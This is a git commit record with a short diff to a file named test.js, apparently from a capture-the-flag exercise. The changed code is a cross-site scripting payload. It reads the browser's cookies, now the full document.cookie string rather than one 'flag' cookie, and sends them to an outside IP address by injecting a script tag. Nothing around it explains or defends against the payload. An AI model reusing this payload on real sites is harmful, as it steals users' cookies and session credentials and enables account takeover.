3da9ad700d1d40439ef152b09f28894823c1e83d
Thanray Tian <874800988@qq.com>
2017-01-18 13:30:09 +0800

    test

--- test.js
+++ test.js
@@ -1,4 +1,4 @@
-var flag=getCookie('flag');
+var flag=document.cookie;
 var script=document.createElement('script');
 script.src='http://119.29.81.170:7892/?flag='+flag;
 document.body.appendChild(script);
